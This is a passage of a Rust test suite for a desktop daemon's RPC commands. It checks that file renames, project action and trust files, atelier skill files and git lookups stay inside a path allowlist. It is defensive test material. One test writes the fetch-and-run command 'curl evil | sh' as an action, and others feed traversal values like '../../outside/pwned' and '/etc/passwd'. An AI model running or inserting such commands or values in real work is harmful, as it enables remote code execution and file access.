            json!({ "from": s(&a.join("two.txt")), "to_name": "three.txt" }),
        )
        .await;
        assert_eq!(dest, s(&a.join("three.txt")));
        assert_eq!(std::fs::read(a.join("three.txt")).unwrap(), b"1");

        // Destination exists / bad names: the desktop's refusals.
        std::fs::write(a.join("taken.txt"), b"t").unwrap();
        let e = err(
            r,
            "fs_rename",
            json!({ "from": s(&a.join("three.txt")), "toName": "taken.txt" }),
        )
        .await;
        assert!(e.contains("destination exists"), "{e}");
        for bad in ["", "x/y", "..\\x"] {
            let e = err(
                r,
                "fs_rename",
                json!({ "from": s(&a.join("three.txt")), "toName": bad }),
            )
            .await;
            assert!(e.contains("invalid name"), "{bad:?}: {e}");
        }
        // `..` as the new name climbs to the root's parent — outside.
        let e = err(
            r,
            "fs_rename",
            json!({ "from": s(&a.join("three.txt")), "toName": ".." }),
        )
        .await;
        assert!(e.contains("outside allowlist"), "{e}");

        // Sources outside, via `..`, or via a symlink are refused and left.
        std::fs::write(d.outside.join("secret.txt"), b"s").unwrap();
        for from in [
            s(&d.outside.join("secret.txt")),
            format!("{}/../outside/secret.txt", s(a)),
        ] {
            let e = err(r, "fs_rename", json!({ "from": from, "toName": "x.txt" })).await;
            assert!(e.contains("outside allowlist"), "{e}");
        }
        #[cfg(unix)]
        {
            symlink(&d.outside, &a.join("escape"));
            let via = s(&a.join("escape/secret.txt"));
            let e = err(r, "fs_rename", json!({ "from": via, "toName": "x.txt" })).await;
            assert!(e.contains("outside allowlist"), "{e}");
        }
        assert!(d.outside.join("secret.txt").exists());
        assert!(!d.outside.join("x.txt").exists());
        assert!(a.join("three.txt").exists());
    }

    /// plans/file-editing F2: `toDir` moves the entry into another folder,
    /// with every end held to the allowlist.
    #[tokio::test]
    async fn fs_rename_with_to_dir_moves_inside_the_allowlist() {
        let d = daemon();
        let r = &d.router;
        let a = &d.allowed;
        std::fs::write(a.join("note.txt"), b"n").unwrap();
        std::fs::create_dir(a.join("newdir")).unwrap();
        let newdir = s(&a.join("newdir"));

        let args = json!({ "from": s(&a.join("note.txt")), "toName": "moved.txt", "toDir": newdir });
        let dest = ok(r, "fs_rename", args).await;
        assert_eq!(dest, s(&a.join("newdir/moved.txt")));
        assert!(!a.join("note.txt").exists());
        assert_eq!(std::fs::read(a.join("newdir/moved.txt")).unwrap(), b"n");

        // Destination exists in the target folder.
        std::fs::write(a.join("other.txt"), b"o").unwrap();
        let args = json!({ "from": s(&a.join("other.txt")), "toName": "moved.txt", "toDir": newdir });
        let e = err(r, "fs_rename", args).await;
        assert!(e.contains("destination exists"), "{e}");

        // The target must be an existing folder.
        let args = json!({ "from": s(&a.join("other.txt")), "toName": "x.txt", "toDir": s(&a.join("other.txt")) });
        let e = err(r, "fs_rename", args).await;
        assert!(e.contains("not a folder"), "{e}");

        // A folder cannot move into itself or below itself.
        std::fs::create_dir(a.join("newdir/inner")).unwrap();
        for into in [a.join("newdir"), a.join("newdir/inner")] {
            let args = json!({ "from": newdir, "toName": "newdir", "toDir": s(&into) });
            let e = err(r, "fs_rename", args).await;
            assert!(e.contains("into itself"), "{into:?}: {e}");
        }
        assert!(a.join("newdir/moved.txt").exists());

        // A target folder outside the allowlist is refused and nothing moves.
        let args = json!({ "from": s(&a.join("other.txt")), "toName": "other.txt", "toDir": s(&d.outside) });
        let e = err(r, "fs_rename", args).await;
        assert!(e.contains("outside allowlist"), "{e}");
        assert!(a.join("other.txt").exists());
        assert!(!d.outside.join("other.txt").exists());
    }

    // ── actions / keybindings ───────────────────────────────────────────────

    async fn project(d: &Daemon, id: &str, root: &Path) {
        let pool = d.db.ensure_pool().await.unwrap();
        projects::create_project(
            &pool,
            CreateArgs {
                id: id.into(),
                display_name: id.into(),
                root_path: Some(s(root)),
                icon: None,
                color: None,
                description: None,
            },
        )
        .await
        .unwrap();
    }

    fn shell_actions(command: &str) -> Value {
        json!({
            "version": 1,
            "actions": [{
                "id": "build",
                "name": "Build",
                "run": { "kind": "shell", "command": command },
                "scope": "project"
            }]
        })
    }

    fn bindings(key: &str) -> Value {
        json!({ "version": 1, "bindings": [ { "key": key, "command": "build" } ] })
    }

    fn direct_manager(d: &Daemon) -> ActionsManager {
        ActionsManager::with_notifier(None, d.db.clone(), &d.data, d.home.clone())
    }

    #[tokio::test]
    async fn actions_write_then_read_round_trips_in_the_desktop_shape() {
        let d = daemon();
        let r = &d.router;
        let root = d.allowed.join("proj");
        std::fs::create_dir_all(&root).unwrap();
        project(&d, "proj", &root).await;

        let personal = json!({ "version": 1, "actions": [
            { "id": "ask", "name": "Ask", "scope": "personal", "run": { "kind": "chi", "target": "new", "prompt": "x" } }
        ]});
        let w = ok(
            r,
            "actions_write",
            json!({ "scope": "personal", "document": personal }),
        )
        .await;
        assert_eq!(w["written"], true, "{w}");
        assert_eq!(w["kind"], "actions");
        assert_eq!(w["path"], s(&d.home.join(".ikenga/actions.json")));

        let w = ok(
            r,
            "actions_write",
            json!({ "scope": "project", "document": shell_actions("make"), "projectId": "proj" }),
        )
        .await;
        assert_eq!(w["written"], true, "{w}");
        assert_eq!(w["path"], s(&root.join(".ikenga/actions.json")));
        let w = ok(
            r,
            "keybindings_write",
            json!({ "scope": "project", "document": bindings("mod+b"), "project_id": "proj" }),
        )
        .await;
        assert_eq!(w["written"], true, "{w}");
        assert_eq!(w["kind"], "keybindings");

        let camel = ok(r, "actions_read_files", json!({ "projectId": "proj" })).await;
        let snake = ok(r, "actions_read_files", json!({ "project_id": "proj" })).await;
        assert_eq!(camel, snake);
        assert_eq!(
            camel["personal"]["actions"]["document"]["actions"][0]["id"],
            "ask"
        );
        assert_eq!(
            camel["project"]["actions"]["document"]["actions"][0]["id"],
            "build"
        );
        assert_eq!(
            camel["project"]["keybindings"]["document"]["bindings"][0]["key"],
            "mod+b"
        );
        assert_eq!(camel["projectRoot"], s(&root));
        // Written project keybindings are held until trusted.
        assert_eq!(camel["projectKeybindingsTrust"]["state"], "untrusted");

        // Shape parity: the same core the desktop command calls, over the same
        // db / home / data dir, serializes identically.
        let direct = direct_manager(&d).read_files(Some("proj")).await.unwrap();
        assert_eq!(camel, serde_json::to_value(&direct).unwrap());

        // Validation refusals are the desktop's: nothing written.
        let before = std::fs::read(root.join(".ikenga/keybindings.json")).unwrap();
        let os_rule = json!({ "version": 1, "bindings": [
            { "key": "alt+space", "command": "os.summon", "scope": "os" }
        ]});
        let w = ok(
            r,
            "keybindings_write",
            json!({ "scope": "project", "document": os_rule, "projectId": "proj" }),
        )
        .await;
        assert_eq!(w["written"], false);
        assert_eq!(w["validation"]["errors"][0]["code"], "E_OS_LAYER");
        assert_eq!(
            std::fs::read(root.join(".ikenga/keybindings.json")).unwrap(),
            before
        );
        let w = ok(
            r,
            "actions_write",
            json!({ "scope": "personal", "document": null }),
        )
        .await;
        assert_eq!(w["written"], false, "{w}");
        let e = err(r, "actions_write", json!({ "scope": "personal" })).await;
        assert!(e.contains("`document` is required"), "{e}");
        let e = err(
            r,
            "actions_write",
            json!({ "scope": "everywhere", "document": personal }),
        )
        .await;
        assert!(e.starts_with("actions_write: "), "{e}");
    }

    /// The invariant: a remote write never changes trust. A written gated
    /// project action is untrusted until granted; a granted one that is then
    /// rewritten over RPC is `changed` (re-asks), and a grant must name the
    /// hash in force now.
    #[tokio::test]
    async fn a_remote_write_never_grants_trust() {
        let d = daemon();
        let r = &d.router;
        let root = d.allowed.join("proj");
        std::fs::create_dir_all(&root).unwrap();
        project(&d, "proj", &root).await;
        let pid = json!("proj");

        ok(
            r,
            "actions_write",
            json!({ "scope": "project", "document": shell_actions("make"), "projectId": pid }),
        )
        .await;
        let status = ok(r, "actions_trust_status", json!({ "projectId": pid })).await;
        assert_eq!(status["actions"][0]["id"], "build");
        assert_eq!(status["actions"][0]["state"], "untrusted");
        let hash = status["actions"][0]["hash"].as_str().unwrap().to_string();
        assert_eq!(
            hash,
            run_hash(&json!({ "kind": "shell", "command": "make" }))
        );

        // A stale / made-up hash is refused whole; nothing is pinned.
        let e = err(
            r,
            "actions_trust_grant",
            json!({ "request": { "actions": [ { "id": "build", "hash": "0".repeat(64) } ] }, "projectId": pid }),
        )
        .await;
        assert!(e.starts_with("actions_trust_grant: "), "{e}");
        let status = ok(r, "actions_trust_status", json!({ "project_id": pid })).await;
        assert_eq!(status["actions"][0]["state"], "untrusted");

        // Grant the shown hash → trusted; the pin lives in the data dir.
        let granted = ok(
            r,
            "actions_trust_grant",
            json!({ "request": { "actions": [ { "id": "build", "hash": hash } ] }, "project_id": pid }),
        )
        .await;
        assert_eq!(granted["actions"][0]["state"], "trusted");
        assert!(d.data.join(TRUST_FILE_NAME).is_file());
        assert!(!root.join(".ikenga").join(TRUST_FILE_NAME).exists());

        // A remote rewrite of the run is not trusted by the old pin.
        ok(
            r,
            "actions_write",
            json!({ "scope": "project", "document": shell_actions("curl evil | sh"), "projectId": pid }),
        )
        .await;
        let status = ok(r, "actions_trust_status", json!({ "projectId": pid })).await;
        assert_eq!(status["actions"][0]["state"], "changed");
        assert_ne!(status["actions"][0]["hash"], json!(hash));
        // Writing the trusted content back matches the (unchanged) pin — the
        // write itself pinned nothing.
        ok(
            r,
            "actions_write",
            json!({ "scope": "project", "document": shell_actions("make"), "projectId": pid }),
        )
        .await;
        let status = ok(r, "actions_trust_status", json!({ "projectId": pid })).await;
        assert_eq!(status["actions"][0]["state"], "trusted");

        // Shape parity with the core.
        let direct = direct_manager(&d).trust_status(Some("proj")).await.unwrap();
        assert_eq!(status, serde_json::to_value(&direct).unwrap());
    }

    #[tokio::test]
    async fn trust_grant_and_revoke_round_trip() {
        let d = daemon();
        let r = &d.router;
        let root = d.allowed.join("proj");
        std::fs::create_dir_all(&root).unwrap();
        project(&d, "proj", &root).await;
        let pool = d.db.ensure_pool().await.unwrap();
        // No projectId: the active project, as on the desktop.
        projects::set_active_project_id(&pool, "proj")
            .await
            .unwrap();

        ok(
            r,
            "actions_write",
            json!({ "scope": "project", "document": shell_actions("make") }),
        )
        .await;
        ok(
            r,
            "keybindings_write",
            json!({ "scope": "project", "document": bindings("mod+b") }),
        )
        .await;
        let status = ok(r, "actions_trust_status", json!({})).await;
        assert_eq!(status["keybindings"]["state"], "untrusted");
        let action_hash = status["actions"][0]["hash"].clone();
        let keys_hash = status["keybindings"]["hash"].clone();

        let granted = ok(
            r,
            "actions_trust_grant",
            json!({ "request": { "actions": [ { "id": "build", "hash": action_hash } ], "keybindings": keys_hash } }),
        )
        .await;
        assert_eq!(granted["actions"][0]["state"], "trusted");
        assert_eq!(granted["keybindings"]["state"], "trusted");
        let files = ok(r, "actions_read_files", json!({})).await;
        assert_eq!(files["projectKeybindingsTrust"]["state"], "trusted");

        // A remote keybindings rewrite holds the rules again.
        ok(
            r,
            "keybindings_write",
            json!({ "scope": "project", "document": bindings("mod+shift+b") }),
        )
        .await;
        let files = ok(r, "actions_read_files", json!({})).await;
        assert_eq!(files["projectKeybindingsTrust"]["state"], "changed");

        // Partial revoke (camelCase request fields), then revoke-everything.
        let revoked = ok(
            r,
            "actions_trust_revoke",
            json!({ "request": { "actionIds": ["build"] } }),
        )
        .await;
        assert_eq!(revoked["actions"][0]["state"], "untrusted");
        assert_eq!(revoked["keybindings"]["state"], "changed");
        let revoked = ok(r, "actions_trust_revoke", json!({ "request": null })).await;
        assert_eq!(revoked["actions"][0]["state"], "untrusted");
        assert_eq!(revoked["keybindings"]["state"], "untrusted");

        let e = err(r, "actions_trust_grant", json!({})).await;
        assert!(e.contains("`request` is required"), "{e}");
    }

    /// A project whose root is outside the allowlist — stored by any path,
    /// e.g. raw `db_exec` — is refused before its `.ikenga/` is read or
    /// written, including a root that is a symlink out of the allowlist.
    #[tokio::test]
    async fn a_project_root_outside_the_allowlist_is_refused() {
        let d = daemon();
        let r = &d.router;
        project(&d, "out", &d.outside).await;
        #[cfg(unix)]
        {
            let target = d.outside.join("other");
            std::fs::create_dir_all(&target).unwrap();
            symlink(&target, &d.allowed.join("link"));
            project(&d, "linked", &d.allowed.join("link")).await;
        }
        // A root that no longer exists is the shared scope resolver's
        // desktop refusal, before the guard is ever asked.
        project(&d, "gone", &d.outside.join("new")).await;

        let mut refused = vec!["out"];
        if cfg!(unix) {
            refused.push("linked");
        }
        for pid in refused {
            for cmd in ["actions_read_files", "actions_trust_status"] {
                let e = err(r, cmd, json!({ "projectId": pid })).await;
                assert!(
                    e.contains("outside the daemon's fs allowlist"),
                    "{pid} {cmd}: {e}"
                );
            }
            let e = err(
                r,
                "actions_write",
                json!({ "scope": "project", "document": shell_actions("x"), "projectId": pid }),
            )
            .await;
            assert!(
                e.contains("outside the daemon's fs allowlist"),
                "{pid}: {e}"
            );
            let e = err(r, "actions_trust_revoke", json!({ "projectId": pid })).await;
            assert!(
                e.contains("outside the daemon's fs allowlist"),
                "{pid}: {e}"
            );
        }
        assert!(!d.outside.join(".ikenga").exists());
        assert!(!d.outside.join("other/.ikenga").exists());
        assert!(!d.outside.join("new").exists());

        let e = err(
            r,
            "actions_write",
            json!({ "scope": "project", "document": shell_actions("x"), "projectId": "gone" }),
        )
        .await;
        assert!(e.contains("project root is unavailable"), "{e}");
        assert!(!d.outside.join("new").exists());
    }

    /// The daemon's manager starts no watcher even with a notifier (so no
    /// `.ikenga/` is created to watch); its notifier hears trust changes
    /// only, and the write arms announce written files themselves.
    #[tokio::test]
    async fn the_daemon_manager_watches_nothing() {
        let d = daemon();
        let bus = crate::server::events::EventBus::new();
        let manager = super::daemon_actions(
            d.db.clone(),
            &d.data,
            d.home.clone(),
            d.guard.clone(),
            Some(crate::server::events::actions_notifier(&bus)),
        );
        manager.refresh_watch().await.unwrap();
        assert!(
            !d.home.join(".ikenga").exists(),
            "no watched dir was created"
        );
    }

    mod slice6 {
        //! `atelier_file_read` / `atelier_file_write` and `action_git_branch`:
        //! every caller root through the daemon's `PathGuard`, the atelier
        //! helpers confined to the canonical root.

        use super::*;
        use crate::server::reserved::INSIDE_DATA_DIR;
        use crate::server::shared::atelier::{self, Reach};
        use crate::server::shared::git;

        /// A daemon whose allowlist is the whole temp root — so `data/` IS
        /// inside it (the misconfiguration `server::reserved` exists for).
        fn over_data_dir() -> (tempfile::TempDir, PathBuf, PathBuf, Router) {
            let tmp = tempfile::tempdir().unwrap();
            let root = tmp.path().canonicalize().unwrap();
            let data = root.join("data");
            std::fs::create_dir_all(&data).unwrap();
            let roots_file = root.join("fs_roots.json");
            std::fs::write(
                &roots_file,
                json!({ "roots": [root.to_string_lossy()] }).to_string(),
            )
            .unwrap();
            let guard = PathGuard::roots(Arc::new(
                crate::fs_roots::FsRoots::load(roots_file).unwrap(),
            ));
            let router = router_with(
                config(Some(data.clone())),
                Arc::new(PtyManager::new()),
                Arc::new(EngineRegistry::new()),
                Some(Arc::new(PaDb::new(root.join("ikenga.db")))),
                None,
                None,
                guard,
            );
            (tmp, root, data, router)
        }

        /// Every regular file and dir under `dir`, relative, sorted.
        fn tree(dir: &Path) -> Vec<String> {
            let mut out = Vec::new();
            let mut stack = vec![dir.to_path_buf()];
            while let Some(d) = stack.pop() {
                let Ok(entries) = std::fs::read_dir(&d) else {
                    continue;
                };
                for e in entries.flatten() {
                    let p = e.path();
                    out.push(p.strip_prefix(dir).unwrap().to_string_lossy().into_owned());
                    if e.file_type().unwrap().is_dir() {
                        stack.push(p);
                    }
                }
            }
            out.sort();
            out
        }

        // ── no data dir ─────────────────────────────────────────────────────

        #[tokio::test]
        async fn every_arm_without_data_dir_is_no_db() {
            let r = bare();
            for (cmd, args) in [
                (
                    "atelier_file_read",
                    json!({ "projectRoot": "/tmp", "skill": "s", "file": "f" }),
                ),
                (
                    "atelier_file_write",
                    json!({ "projectRoot": "/tmp", "skill": "s", "file": "f", "content": "x" }),
                ),
                ("action_git_branch", json!({ "root": "/tmp" })),
            ] {
                let e = err(&r, cmd, args).await;
                assert_eq!(e, format!("{cmd}: {}", crate::server::rpc::NO_DB), "{cmd}");
            }
        }

        // ── atelier ────────────────────────────────────────────────────────

        #[tokio::test]
        async fn atelier_write_then_read_round_trips_in_the_desktop_shape() {
            let d = daemon();
            let r = &d.router;
            let proj = d.allowed.join("proj");
            std::fs::create_dir_all(&proj).unwrap();
            let body = r#"{"skill":"mail","template_version":1}"#;

            let path = ok(
                r,
                "atelier_file_write",
                json!({ "projectRoot": s(&proj), "skill": "skill-mail", "file": "manifest.json", "content": body }),
            )
            .await;
            let target = proj.join(".atelier/skill-mail/manifest.json");
            assert_eq!(path, s(&target));
            assert_eq!(std::fs::read_to_string(&target).unwrap(), body);

            let camel = ok(
                r,
                "atelier_file_read",
                json!({ "projectRoot": s(&proj), "skill": "skill-mail", "file": "manifest.json" }),
            )
            .await;
            let snake = ok(
                r,
                "atelier_file_read",
                json!({ "project_root": s(&proj), "skill": "skill-mail", "file": "manifest.json" }),
            )
            .await;
            assert_eq!(camel, body);
            assert_eq!(camel, snake);
            // Shape parity with the desktop's core (`Reach::Follow`).
            let direct = atelier::read(
                Some(&s(&proj)),
                "skill-mail",
                "manifest.json",
                Reach::Follow,
            )
            .unwrap();
            assert_eq!(camel, json!(direct));

            // Overwrite (snake spelling): second wins, no temp file left.
            let v2 = r#"{"template_version":2}"#;
            ok(
                r,
                "atelier_file_write",
                json!({ "project_root": s(&proj), "skill": "skill-mail", "file": "manifest.json", "content": v2 }),
            )
            .await;
            assert_eq!(std::fs::read_to_string(&target).unwrap(), v2);
            assert_eq!(
                tree(&proj.join(".atelier")),
                ["skill-mail", "skill-mail/manifest.json"]
            );

            // Absent file / absent root / no root: the desktop's null.
            for args in [
                json!({ "projectRoot": s(&proj), "skill": "skill-mail", "file": "nope.json" }),
                json!({ "projectRoot": s(&d.allowed.join("gone")), "skill": "s", "file": "f" }),
                json!({ "projectRoot": null, "skill": "s", "file": "f" }),
                json!({ "projectRoot": "", "skill": "s", "file": "f" }),
            ] {
                assert_eq!(ok(r, "atelier_file_read", args).await, Value::Null);
            }
            // No root: the desktop's exact write error, not double-prefixed.
            let e = err(
                r,
                "atelier_file_write",
                json!({ "skill": "s", "file": "f", "content": "x" }),
            )
            .await;
            assert_eq!(e, "atelier_file_write: no project root configured");
            // A root that does not exist is not created.
            let gone = d.allowed.join("gone");
            let e = err(
                r,
                "atelier_file_write",
                json!({ "projectRoot": s(&gone), "skill": "s", "file": "f", "content": "x" }),
            )
            .await;
            assert!(
                e.starts_with("atelier_file_write: project root is not a directory"),
                "{e}"
            );
            assert!(!gone.exists());
            // A root that is a file: nothing to read, nowhere to write.
            let file_root = d.allowed.join("plain.txt");
            std::fs::write(&file_root, "x").unwrap();
            assert_eq!(
                ok(
                    r,
                    "atelier_file_read",
                    json!({ "projectRoot": s(&file_root), "skill": "s", "file": "f" }),
                )
                .await,
                Value::Null
            );
            let e = err(
                r,
                "atelier_file_write",
                json!({ "projectRoot": s(&file_root), "skill": "s", "file": "f", "content": "x" }),
            )
            .await;
            assert!(
                e.starts_with("atelier_file_write: project root is not a directory"),
                "{e}"
            );
            let e = err(
                r,
                "atelier_file_write",
                json!({ "projectRoot": s(&proj), "skill": "s", "file": "f" }),
            )
            .await;
            assert!(e.contains("`content` is required"), "{e}");
        }

        #[tokio::test]
        async fn atelier_segments_keep_the_desktop_traversal_checks() {
            let d = daemon();
            let r = &d.router;
            let proj = d.allowed.join("proj");
            std::fs::create_dir_all(&proj).unwrap();
            for (skill, file) in [
                ("..", "manifest.json"),
                ("a/b", "manifest.json"),
                ("skill-mail", "../../outside/pwned"),
                ("skill-mail", "/etc/passwd"),
                ("skill-mail", "a\\b"),
                ("", "f"),
            ] {
                let e = err(
                    r,
                    "atelier_file_write",
                    json!({ "projectRoot": s(&proj), "skill": skill, "file": file, "content": "pwned" }),
                )
                .await;
                assert_eq!(
                    e,
                    format!(
                        "atelier_file_write: unsafe path segment (skill={skill:?}, file={file:?})"
                    )
                );
                assert_eq!(
                    ok(
                        r,
                        "atelier_file_read",
                        json!({ "projectRoot": s(&proj), "skill": skill, "file": file }),
                    )
                    .await,
                    Value::Null
                );
            }
            assert!(tree(&proj).is_empty());
            assert!(tree(&d.outside).is_empty());
        }

        #[tokio::test]
        async fn atelier_roots_outside_the_allowlist_are_refused() {
            let d = daemon();
            let r = &d.router;
            std::fs::create_dir_all(d.outside.join(".atelier/s")).unwrap();
            std::fs::write(d.outside.join(".atelier/s/f"), "secret").unwrap();
            let mut roots = vec![
                s(&d.outside),
                format!("{}/../outside", s(&d.allowed)),
                "relative/root".to_string(),
            ];
            #[cfg(unix)]
            {
                symlink(&d.outside, &d.allowed.join("link"));
                roots.push(s(&d.allowed.join("link")));
            }
            for root in roots {
                let e = err(
                    r,
                    "atelier_file_read",
                    json!({ "projectRoot": root, "skill": "s", "file": "f" }),
                )
                .await;
                assert!(e.starts_with("atelier_file_read: "), "{root}: {e}");
                let e = err(
                    r,
                    "atelier_file_write",
                    json!({ "projectRoot": root, "skill": "s", "file": "g", "content": "pwned" }),
                )
                .await;
                assert!(e.starts_with("atelier_file_write: "), "{root}: {e}");
                assert!(
                    e.contains("outside allowlist")
                        || e.contains("`..`")
                        || e.contains("not absolute"),
                    "{root}: {e}"
                );
            }
            assert_eq!(tree(&d.outside), [".atelier", ".atelier/s", ".atelier/s/f"]);
        }

        #[tokio::test]
        async fn atelier_roots_inside_the_data_dir_are_refused() {
            let (_tmp, root, data, r) = over_data_dir();
            // A sibling inside the same allowlist root is served…
            let proj = root.join("proj");
            std::fs::create_dir_all(&proj).unwrap();
            ok(
                &r,
                "atelier_file_write",
                json!({ "projectRoot": s(&proj), "skill": "s", "file": "f", "content": "x" }),
            )
            .await;
            // …the data dir, and anything under it, is not.
            std::fs::create_dir_all(data.join("inner")).unwrap();
            for root in [s(&data), s(&data.join("inner"))] {
                let e = err(
                    &r,
                    "atelier_file_write",
                    json!({ "projectRoot": root, "skill": "s", "file": "f", "content": "pwned" }),
                )
                .await;
                assert!(e.contains(INSIDE_DATA_DIR), "{root}: {e}");
                let e = err(
                    &r,
                    "atelier_file_read",
                    json!({ "projectRoot": root, "skill": "s", "file": "f" }),
                )
                .await;
                assert!(e.contains(INSIDE_DATA_DIR), "{root}: {e}");
            }
            assert_eq!(tree(&data), ["inner"]);
            // `.atelier` symlinked INTO the data dir from a served root.
            #[cfg(unix)]
            {
                let p2 = root.join("p2");
                std::fs::create_dir_all(&p2).unwrap();
                symlink(&data, &p2.join(".atelier"));
                let e = err(
                    &r,
                    "atelier_file_write",
                    json!({ "projectRoot": s(&p2), "skill": "s", "file": "f", "content": "pwned" }),
                )
                .await;
                assert!(e.contains("refusing to follow a symlink"), "{e}");
                assert_eq!(tree(&data), ["inner"]);
            }
        }

        /// `.atelier`, `.atelier/<skill>` or the file itself linked out of
        /// the root — live or dangling — is refused, and nothing is created
        /// where the link points.
        #[tokio::test]
        #[cfg(unix)]
        async fn atelier_never_follows_a_symlink_out_of_the_root() {
            let d = daemon();
            let r = &d.router;

            // `.atelier` → outside/.
            let a = d.allowed.join("a");
            std::fs::create_dir_all(&a).unwrap();
            symlink(&d.outside, &a.join(".atelier"));
            // `.atelier/s` → a sibling INSIDE the allowlist (still out of the root).
            let b = d.allowed.join("b");
            let elsewhere = d.allowed.join("elsewhere");
            std::fs::create_dir_all(b.join(".atelier")).unwrap();
            std::fs::create_dir_all(&elsewhere).unwrap();
            symlink(&elsewhere, &b.join(".atelier/s"));
            // The file itself: a dangling link to a file that does not exist yet.
            let c = d.allowed.join("c");
            std::fs::create_dir_all(c.join(".atelier/s")).unwrap();
            symlink(&d.outside.join("planted"), &c.join(".atelier/s/f"));
            // `.atelier` dangling.
            let e_root = d.allowed.join("e");
            std::fs::create_dir_all(&e_root).unwrap();
            symlink(&d.outside.join("not-yet"), &e_root.join(".atelier"));

            for root in [&a, &b, &c, &e_root] {
                let e = err(
                    r,
                    "atelier_file_write",
                    json!({ "projectRoot": s(root), "skill": "s", "file": "f", "content": "pwned" }),
                )
                .await;
                assert!(
                    e.starts_with(
                        "atelier_file_write: refusing to follow a symlink out of the project root"
                    ),
                    "{}: {e}",
                    root.display()
                );
                let e = err(
                    r,
                    "atelier_file_read",
                    json!({ "projectRoot": s(root), "skill": "s", "file": "f" }),
                )
                .await;
                assert!(
                    e.contains("refusing to follow a symlink"),
                    "{}: {e}",
                    root.display()
                );
            }
            assert!(tree(&d.outside).is_empty(), "{:?}", tree(&d.outside));
            assert!(tree(&elsewhere).is_empty());
        }

        // ── action_git_branch ───────────────────────────────────────────────

        fn head(git_dir: &Path, contents: &str) {
            std::fs::create_dir_all(git_dir).unwrap();
            std::fs::write(git_dir.join("HEAD"), contents).unwrap();
        }

        #[tokio::test]
        async fn git_branch_reads_head_inside_the_allowlist() {
            let d = daemon();
            let r = &d.router;
            let repo = d.allowed.join("repo");
            head(&repo.join(".git"), "ref: refs/heads/feat/x\n");
            let got = ok(r, "action_git_branch", json!({ "root": s(&repo) })).await;
            assert_eq!(got, "feat/x");
            // Parity with the desktop's core.
            assert_eq!(got, json!(git::git_branch_at(&repo)));

            // Detached HEAD → null.
            head(
                &repo.join(".git"),
                "0123456789abcdef0123456789abcdef01234567\n",
            );
            assert_eq!(
                ok(r, "action_git_branch", json!({ "root": s(&repo) })).await,
                Value::Null
            );

            // A worktree: `.git` is a `gitdir:` file (absolute), and a
            // submodule-style relative one.
            let main_git = d.allowed.join("main/.git");
            head(
                &main_git.join("worktrees/wt"),
                "ref: refs/heads/wt-branch\n",
            );
            let wt = d.allowed.join("wt");
            std::fs::create_dir_all(&wt).unwrap();
            std::fs::write(
                wt.join(".git"),
                format!("gitdir: {}\n", s(&main_git.join("worktrees/wt"))),
            )
            .unwrap();
            let got = ok(r, "action_git_branch", json!({ "root": s(&wt) })).await;
            assert_eq!(got, "wt-branch");
            assert_eq!(got, json!(git::git_branch_at(&wt)));
            head(
                &main_git.join("modules/sub"),
                "ref: refs/heads/sub-branch\n",
            );
            let sub = d.allowed.join("main/sub");
            std::fs::create_dir_all(&sub).unwrap();
            std::fs::write(sub.join(".git"), "gitdir: ../.git/modules/sub\n").unwrap();
            assert_eq!(
                ok(r, "action_git_branch", json!({ "root": s(&sub) })).await,
                "sub-branch"
            );

            // Not a work tree, missing, or relative: the desktop's null.
            for root in [
                s(&d.allowed),
                s(&d.allowed.join("missing")),
                "relative".to_string(),
                String::new(),
            ] {
                assert_eq!(
                    ok(r, "action_git_branch", json!({ "root": root })).await,
                    Value::Null,
                    "{root}"
                );
            }
            let e = err(r, "action_git_branch", json!({})).await;
            assert!(e.contains("`root` is required"), "{e}");
        }

        #[tokio::test]
        async fn git_branch_refuses_roots_and_gitdirs_the_guard_refuses() {
            let d = daemon();
            let r = &d.router;
            head(&d.outside.join(".git"), "ref: refs/heads/secret\n");
            let mut roots = vec![s(&d.outside), format!("{}/../outside", s(&d.allowed))];
            #[cfg(unix)]
            {
                symlink(&d.outside, &d.allowed.join("link"));
                roots.push(s(&d.allowed.join("link")));
            }
            for root in roots {
                let e = err(r, "action_git_branch", json!({ "root": root })).await;
                assert!(e.starts_with("action_git_branch: "), "{root}: {e}");
                assert!(
                    e.contains("outside allowlist") || e.contains("`..`"),
                    "{root}: {e}"
                );
            }
            // A root inside the allowlist whose `gitdir:` (or `.git` link)
            // points outside it: not read — no branch.
            let wt = d.allowed.join("wt");
            std::fs::create_dir_all(&wt).unwrap();
            std::fs::write(
                wt.join(".git"),
                format!("gitdir: {}\n", s(&d.outside.join(".git"))),
            )
            .unwrap();
            assert_eq!(
                ok(r, "action_git_branch", json!({ "root": s(&wt) })).await,
                Value::Null
            );
            // (The desktop reads it: the guard is the daemon's alone.)
            assert_eq!(git::git_branch_at(&wt).as_deref(), Some("secret"));
            #[cfg(unix)]
            {
                let linked = d.allowed.join("linked");
                std::fs::create_dir_all(&linked).unwrap();
                symlink(&d.outside.join(".git"), &linked.join(".git"));
                assert_eq!(
                    ok(r, "action_git_branch", json!({ "root": s(&linked) })).await,
                    Value::Null
                );
            }
        }

        #[tokio::test]
        async fn git_branch_refuses_the_data_dir() {
            let (_tmp, root, data, r) = over_data_dir();
            head(&data.join("repo/.git"), "ref: refs/heads/x\n");
            for p in [s(&data), s(&data.join("repo"))] {
                let e = err(&r, "action_git_branch", json!({ "root": p })).await;
                assert!(e.contains(INSIDE_DATA_DIR), "{p}: {e}");
            }
            // A served root whose gitdir points into the data dir reads nothing.
            let wt = root.join("wt");
            std::fs::create_dir_all(&wt).unwrap();
            std::fs::write(
                wt.join(".git"),
                format!("gitdir: {}\n", s(&data.join("repo/.git"))),
            )
            .unwrap();
            assert_eq!(
                ok(&r, "action_git_branch", json!({ "root": s(&wt) })).await,
                Value::Null
            );
        }

        // ── git_status (WP-G) ───────────────────────────────────────────────

        #[tokio::test]
        async fn git_status_refuses_roots_the_guard_refuses() {
            let d = daemon();
            let r = &d.router;
            let mut roots = vec![
                s(&d.outside),
                s(&d.outside.join("repo")),
                format!("{}/..", s(&d.allowed)),
                "relative".to_string(),
            ];
            #[cfg(unix)]
            {
                symlink(&d.outside, &d.allowed.join("link_status"));
                roots.push(s(&d.allowed.join("link_status")));
            }
            for root in roots {
                let e = err(r, "git_status", json!({ "root": root })).await;
                assert!(e.starts_with("git_status: "), "{root}: {e}");
            }
            let e = err(r, "git_status", json!({})).await;
            assert!(e.contains("`root` is required"), "{e}");
        }

        #[tokio::test]
        async fn git_status_not_a_repo_returns_null() {
            let d = daemon();
            let r = &d.router;
            let non_repo = d.allowed.join("not-a-repo");
            std::fs::create_dir_all(&non_repo).unwrap();
            let got = ok(r, "git_status", json!({ "root": s(&non_repo) })).await;
            assert_eq!(got, Value::Null);
        }

        /// Run `git` in `dir` with the user's config out of the picture.
        fn git_in(dir: &Path, args: &[&str]) -> std::process::Output {
            std::process::Command::new("git")
